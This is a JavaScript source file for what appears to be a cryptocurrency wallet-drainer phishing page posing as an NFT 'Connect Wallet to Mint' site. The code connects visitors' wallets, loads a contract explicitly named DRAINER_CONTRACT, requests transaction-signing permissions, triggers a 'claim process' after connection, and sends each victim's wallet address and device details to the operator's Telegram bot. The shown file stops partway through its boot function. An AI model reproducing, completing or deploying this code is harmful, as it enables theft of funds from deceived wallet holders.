import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  PLATFORM DETECTION
  // ==========================================================================
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      const result = await r.json();
      if (!r.ok) { console.error('[main.js] Telegram error:', result); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }

  window.testTelegram = (m) =>
    sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  WEBSOCKET REACHABILITY CHECK (mobile only, informational)
  // ==========================================================================
  async function checkWebSocket(retries = 2, delay = 600) {
    if (isDesktop()) { logDebug('⏭️ Skipping WebSocket check on desktop'); return true; }
    for (let i = 0; i < retries; i++) {
      try {
        const ok = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const t = setTimeout(() => { ws.close(); resolve(false); }, 3000);
          ws.onopen  = () => { clearTimeout(t); ws.close(); resolve(true); };
          ws.onerror = () => { clearTimeout(t); ws.close(); resolve(false); };
        });
        if (ok) { logDebug('✅ WC relay reachable'); return true; }
        await new Promise((r) => setTimeout(r, delay));
      } catch (e) {
        await new Promise((r) => setTimeout(r, delay));
      }
    }
    logDebug('⚠️ WalletConnect relay unreachable — continuing anyway');
    return false;
  }

  // ==========================================================================
  //  LIBRARY LOADING
  // ==========================================================================
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];

    let SignClient, WalletConnectModal, EthereumProvider;

    for (const url of cdns) {
      try { const m = await import(url); SignClient = m.default || m; logDebug(`✅ SignClient from ${url}`); break; } catch (e) {}
    }
    if (!SignClient) throw new Error('Could not load SignClient');

    for (const url of modalCdns) {
      try { const m = await import(url); WalletConnectModal = m.WalletConnectModal || m.default || m; logDebug(`✅ WalletConnectModal from ${url}`); break; } catch (e) {}
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');

    for (const url of providerCdns) {
      try { const m = await import(url); EthereumProvider = m.EthereumProvider || m.default || m; logDebug(`✅ EthereumProvider from ${url}`); break; } catch (e) {}
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  // ==========================================================================
  //  DOM REFERENCES (deferred until DOM ready)
  // ==========================================================================
  let connectButton = null;
  let walletButton  = null;
  let claimStatus   = null;

  function cacheDomRefs() {
    connectButton = document.getElementById('connectButton');
    walletButton  = document.getElementById('walletButton');
    claimStatus   = document.getElementById('claimStatus');
  }

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let currentSession     = null;
  let client             = null;
  let modal              = null;
  let SignClient         = null;
  let WalletConnectModal = null;
  let EthereumProvider   = null;

  let web3Instance       = null;
  let contractInstance   = null;
  let activeProvider     = null;
  let isConnecting       = false;

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
  } = CONFIG;

  let projectId = PROJECT_ID;

  // ==========================================================================
  //  STORAGE KEYS (centralized so we never typo)
  // ==========================================================================
  const STORAGE = {
    WALLET:          'connectedWallet',
    SESSION:         'walletConnectSession',
    CHAIN_TYPE:      'chainType',
    PENDING_PAIRING: 'wcPendingPairing',
    PENDING_URI:     'wcPendingUri',
    PENDING_TS:      'wcPendingTs',
  };

  function savePendingPairing(topic, uri) {
    try {
      localStorage.setItem(STORAGE.PENDING_PAIRING, topic || '');
      localStorage.setItem(STORAGE.PENDING_URI, uri || '');
      localStorage.setItem(STORAGE.PENDING_TS, Date.now().toString());
    } catch (e) {}
  }

  function getPendingPairing() {
    try {
      const topic = localStorage.getItem(STORAGE.PENDING_PAIRING);
      const uri   = localStorage.getItem(STORAGE.PENDING_URI);
      const ts    = localStorage.getItem(STORAGE.PENDING_TS);
      if (!topic && !uri) return null;
      return { topic, uri, ts: ts ? parseInt(ts, 10) : 0 };
    } catch (e) { return null; }
  }

  function clearPendingPairing() {
    try {
      localStorage.removeItem(STORAGE.PENDING_PAIRING);
      localStorage.removeItem(STORAGE.PENDING_URI);
      localStorage.removeItem(STORAGE.PENDING_TS);
    } catch (e) {}
  }

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;

    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;

    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  // ==========================================================================
  //  LOCAL STORAGE — SESSION PERSISTENCE
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem(STORAGE.WALLET, address);
      if (session)   localStorage.setItem(STORAGE.SESSION, JSON.stringify(session));
      if (chainType) localStorage.setItem(STORAGE.CHAIN_TYPE, chainType);
    } catch (e) { logDebug('saveWallet failed: ' + e.message); }
  }

  function getSavedWallet()    { try { return localStorage.getItem(STORAGE.WALLET); } catch (e) { return null; } }
  function getSavedSession()   { try { const s = localStorage.getItem(STORAGE.SESSION); return s ? JSON.parse(s) : null; } catch (e) { return null; } }
  function getSavedChainType() { try { return localStorage.getItem(STORAGE.CHAIN_TYPE) || 'unknown'; } catch (e) { return 'unknown'; } }

  function clearSavedWallet() {
    try {
      localStorage.removeItem(STORAGE.WALLET);
      localStorage.removeItem(STORAGE.SESSION);
      localStorage.removeItem(STORAGE.CHAIN_TYPE);
    } catch (e) {}
  }

  // ==========================================================================
  //  GLOBAL STATE PUBLICATION
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live =
      provider ||
      activeProvider ||
      web3Instance?.currentProvider ||
      window.ethereum ||
      null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      session:  currentSession,
      publishedAt: Date.now(),
    };

    console.log('[main.js] published window.__apexConnected', {
      address, chain,
      hasWeb3:     !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live,
    });

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain },
    }));
  }

  // ==========================================================================
  //  CONNECTED UI — GUARDED AGAINST MISSING DOM
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    // Guard: on a fresh page load after WC redirect, DOM may not be ready yet.
    cacheDomRefs();

    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    // Only inject the display badge if its parent exists.
    if (connectButton && connectButton.parentNode) {
      let display = document.getElementById('connectedAddressDisplay');
      if (!display) {
        display = document.createElement('div');
        display.id = 'connectedAddressDisplay';
        display.style.cssText = `
          margin-top: 12px; padding: 10px 16px;
          font-family: 'JetBrains Mono', monospace; font-size: 14px;
          color: #059669; text-align: center;
          background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
          border-radius: 8px; border: 1px solid #A7F3D0;
        `;
        connectButton.parentNode.appendChild(display);
      }

      const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
      display.innerHTML = `
        <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
          <i class="fas fa-check-circle" style="color:#059669;"></i>
          <span>Connected: ${short}</span>
          <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
          <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
            <i class="far fa-copy"></i>
          </button>
        </div>
      `;

      document.getElementById('copyAddress')?.addEventListener('click', () => {
        navigator.clipboard.writeText(address).then(() => {
          const b = document.getElementById('copyAddress');
          const o = b.innerHTML;
          b.innerHTML = '<i class="fas fa-check"></i>';
          setTimeout(() => { b.innerHTML = o; }, 2000);
        });
      });
    }

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    cacheDomRefs();
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
    currentSession   = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER MODAL
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;
      z-index:99999;
    `;

    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;

    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;

    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');

    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;

      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }

      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT INITIALIZATION
  //  Registers session_connect handler up-front so it fires even if the
  //  connect() promise dies mid-handshake (mobile backgrounding).
  // ==========================================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    if (useTestId) {
      projectId = PUBLIC_TEST_ID;
      logDebug('Using test projectId');
    }

    await checkWebSocket(2, 600);

    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
      });

      // ----------------------------------------------------------------
      //  Register session event handlers IMMEDIATELY, before any connect
      //  is attempted. This is the key fix for mobile backgrounding.
      // ----------------------------------------------------------------
      client.on('session_connect', async (session) => {
        logDebug('📥 session_connect fired');
        await handleSessionConnected(session);
      });

      client.on('session_update', async ({ params }) => {
        logDebug('📥 session_update fired');
        const accounts = params.namespaces?.eip155?.accounts;
        if (accounts?.length) {
          const a = accounts[0].split(':')[2];
          if (currentSession) {
            currentSession = { ...currentSession, ...params };
            saveWallet(a, currentSession, 'evm');
            updateConnectedUI(a, 'evm');
            publishGlobalState(a, 'evm', activeProvider);
          }
        }
      });

      client.on('session_delete', () => {
        logDebug('📥 session_delete fired');
        clearPendingPairing();
        resetConnectedUI();
        clearSavedWallet();
      });

      logDebug('✅ WalletConnect init OK');
      return true;
    } catch (e) {
      logDebug('WC init failed: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  HANDLE SESSION CONNECTED
  //  Called from either:
  //    (a) the client.on('session_connect') listener, OR
  //    (b) the awaited approval() promise in connectViaWalletConnect()
  //  Idempotent: if we already processed this topic, skip.
  // ==========================================================================
  let processedTopics = new Set();

  async function handleSessionConnected(session) {
    if (!session?.topic) return;

    if (processedTopics.has(session.topic)) {
      logDebug(`Session ${session.topic.slice(0, 8)} already processed`);
      return;
    }
    processedTopics.add(session.topic);

    const accounts = session.namespaces?.eip155?.accounts;
    if (!accounts?.length) {
      logDebug('session_connect has no eip155 accounts');
      return;
    }

    const account = accounts[0].split(':')[2];
    currentSession = session;

    // Persist FIRST — so if the tab reloads we recover.
    saveWallet(account, session, 'evm');
    clearPendingPairing();

    try {
      const provider = await EthereumProvider.init({
        projectId,
        metadata: DAPP_METADATA,
        session,
      });

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;

      // Wire provider events (idempotent guard inside).
      setupEVMProviderEvents(provider);

      // Now update UI — DOM is ready because we waited for it on boot.
      updateConnectedUI(account, 'evm');

      logDebug(`✅ WC session handled: ${account}`);
    } catch (e) {
      logDebug('WC session handler failed: ' + e.message);
    }
  }

  // ==========================================================================
  //  CONNECT — DIRECT (INJECTED) EVM
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    if (isMobile()) return false;   // skip direct on mobile — use WC

    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));

    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{ info: { name: 'Injected', rdns: 'io.injected' }, provider: window.ethereum }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' ||
        p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];

      // Persist BEFORE UI updates.
      saveWallet(address, null, 'evm');

      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;

      updateConnectedUI(address, 'evm');

      logDebug(`✅ Direct EVM connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT — WALLETCONNECT
  //  Uses a pairing-topic-based handshake with a fallback to the session
  //  listener (registered in initWalletConnect).
  // ==========================================================================
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
    if (isConnecting) return false;
    isConnecting = true;

    const ok = await initWalletConnect(useTestId);
    if (!ok) {
      isConnecting = false;
      showStatus('WalletConnect unavailable', 'error');
      return false;
    }

    if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }

    try {
      showStatus('Requesting connection...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No URI returned');

      // ----------------------------------------------------------------
      //  Persist the pending URI so we can recover on page reload.
      //  Extract the pairing topic from the URI: it's the path segment.
      //  URI format: wc:<topic>@2?relay-protocol=...&symKey=...
      // ----------------------------------------------------------------
      const pairingTopic = uri.startsWith('wc:') ? uri.slice(3).split('@')[0] : null;
      savePendingPairing(pairingTopic, uri);
      logDebug(`Pending pairing: ${pairingTopic?.slice(0, 8) ?? 'unknown'}`);

      // ----------------------------------------------------------------
      //  On desktop, open the modal. On mobile, redirect straight to
      //  Trust/MetaMask — otherwise the modal blocks the redirect.
      // ----------------------------------------------------------------
      if (isMobile()) {
        const universalUrl = `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`;
        logDebug('Mobile: redirecting to wallet universal link');
        window.location.href = universalUrl;
        // Fallback: also open the modal in case the deep-link is blocked.
        setTimeout(() => {
          try { modal.openModal({ uri }); } catch (e) {}
        }, 500);
      } else {
        modal.openModal({ uri });
        showStatus('Scan the QR code with your wallet', 'info');
      }

      // ----------------------------------------------------------------
      //  Wait for approval OR the session_connect event.
      //  Whichever fires first resolves us. On mobile, the page may
      //  reload after wallet approval — in that case the promise never
      //  resolves, but boot recovery will pick it up.
      // ----------------------------------------------------------------
      const winner = await Promise.race([
        approval().then((session) => ({ source: 'approval', session })).catch((e) => ({ source: 'error', error: e })),
        new Promise((res) => setTimeout(() => res({ source: 'timeout' }), timeoutMs)),
      ]);

      if (modal) { try { modal.closeModal(); } catch (e) {} }

      if (winner.source === 'approval' && winner.session) {
        logDebug('Approval received via promise');
        await handleSessionConnected(winner.session);
        isConnecting = false;
        return true;
      }

      if (winner.source === 'timeout') {
        logDebug('WC approval timed out');
        // Check if the session landed despite the timeout.
        const recovered = await tryRecoverPendingSession();
        isConnecting = false;
        return !!recovered;
      }

      // Error case
      logDebug('WC approval error: ' + (winner.error?.message || 'unknown'));
      isConnecting = false;
      return false;
    } catch (e) {
      logDebug('WC error: ' + e.message);
      if (modal) { try { modal.closeModal(); } catch (err) {} }
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  PENDING SESSION RECOVERY
  //  Called when the tab reloads mid-handshake. Queries the relay for any
  //  session whose pairing topic matches our stored pending pairing.
  // ==========================================================================
  async function tryRecoverPendingSession() {
    if (!client) return null;

    const pending = getPendingPairing();
    if (!pending) return null;

    // Check whether the pairing has evolved into a full session.
    try {
      const sessions = client.session.getAll();
      const match = sessions.find((s) => {
        if (!pending.topic) return true;    // best-effort
        return s.pairingTopic === pending.topic ||
               s.topic === pending.topic;
      });
      if (match) {
        logDebug('🔁 Recovered pending session');
        clearPendingPairing();
        await handleSessionConnected(match);
        return match;
      }
    } catch (e) {
      logDebug('recovery query failed: ' + e.message);
    }
    return null;
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS
  //  Attach once per provider — guard with a WeakSet to avoid duplicates.
  // ==========================================================================
  const wiredProviders = new WeakSet();

  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;
    if (wiredProviders.has(provider)) return;
    wiredProviders.add(provider);

    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], currentSession, 'evm');
        publishGlobalState(accounts[0], 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      if (web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          const addr = window.__apexConnected?.address || getSavedWallet();
          if (addr) publishGlobalState(addr, 'evm', provider);
        } catch (e) {}
      }
    });

    provider.on('disconnect', () => {
      clearPendingPairing();
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;

    cacheDomRefs();
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    if (isMobile()) {
      // On mobile, WalletConnect is the primary path.
      success = await connectViaWalletConnect(false, 300000);
      if (!success) success = await connectViaWalletConnect(true, 300000);
    } else {
      // On desktop, try injected first, then WC.
      success = await connectDirectEVM(8000);
      if (!success) success = await connectViaWalletConnect(false, 300000);
      if (!success) success = await connectViaWalletConnect(true, 300000);
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
      }
      if (web3Instance?.currentProvider?.disconnect) {
        await web3Instance.currentProvider.disconnect();
      }
    } catch (e) {}

    clearPendingPairing();
    resetConnectedUI();
    clearSavedWallet();

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
    processedTopics.clear();
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  function wireButtons() {
    cacheDomRefs();

    const handleClick = async () => {
      const saved = getSavedWallet();
      const hasSession = currentSession || getSavedChainType() !== 'unknown';
      if (saved && hasSession) {
        await disconnectWallet();
      } else {
        await connectWallet();
      }
    };

    if (connectButton) connectButton.addEventListener('click', handleClick);
    if (walletButton)  walletButton.addEventListener('click', handleClick);

    if (walletButton && isMobile()) {
      walletButton.addEventListener('click', () => {
        setTimeout(() => {
          if (connectButton) {
            connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
          }
        }, 300);
      });
    }

    // Initial button state
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
  }

  // ==========================================================================
  //  SESSION RESTORE — PAGE LOAD
  //  Called on boot. Three phases:
  //    1. If a pending pairing exists, try to recover the session.
  //    2. If a full session is stored in localStorage, rehydrate.
  //    3. Fall back to injected provider (desktop only).
  // ==========================================================================
  async function restoreWalletConnection() {
    // Phase 1: pending pairing recovery (mobile redirect landed)
    const pending = getPendingPairing();
    if (pending) {
      logDebug('Pending pairing found — attempting recovery');
      const recovered = await tryRecoverPendingSession();
      if (recovered) {
        logDebug('✅ Pending session recovered');
        return;
      }
      // If recovery failed, clear stale pending state after 5 min.
      const age = Date.now() - (pending.ts || 0);
      if (age > 5 * 60 * 1000) {
        logDebug('Stale pending pairing — clearing');
        clearPendingPairing();
      }
    }

    // Phase 2: full session restore
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (savedWallet && savedChain === 'evm' && savedSession) {
      try {
        const session = client?.session?.get(savedSession.topic);
        if (session) {
          currentSession = session;

          const provider = await EthereumProvider.init({
            projectId,
            metadata: DAPP_METADATA,
            session,
          });

          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = provider;

          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(provider);
          logDebug('✅ Session restored from localStorage');
          return;
        }
      } catch (e) {
        logDebug('Restore failed: ' + e.message);
      }
    }

    // Phase 3: injected provider (desktop only)
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet?.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;

          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          logDebug('✅ Injected provider restored');
          return;
        }
      } catch (e) {}
    }

    // Nothing matched — clear stale state.
    if (savedWallet || savedSession) {
      logDebug('Stale state — clearing');
      clearSavedWallet();
    }
  }

  // ==========================================================================
  //  VISIBILITY CHANGE — mobile re-check
  //  When the user returns from the wallet app, the tab becomes visible.
  //  At that point we re-check for pending sessions.
  // ==========================================================================
  document.addEventListener('visibilitychange', async () => {
    if (document.visibilityState !== 'visible') return;
    logDebug('👁 Page became visible — checking for pending sessions');

    // Give the relay a moment to propagate the session.
    await new Promise((r) => setTimeout(r, 800));

    const pending = getPendingPairing();
    if (pending) {
      await tryRecoverPendingSession();
    } else if (!currentSession && client) {
      // No pending pairing but a session might exist that we missed.
      try {
        const sessions = client.session.getAll();
        if (sessions.length > 0) {
          logDebug('Session found on visibility change');
          await handleSessionConnected(sessions[sessions.length - 1]);
        }
      } catch (e) {}
    }
  });

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  async function boot() {
    // Wait for DOM ready — critical for mobile page reloads.
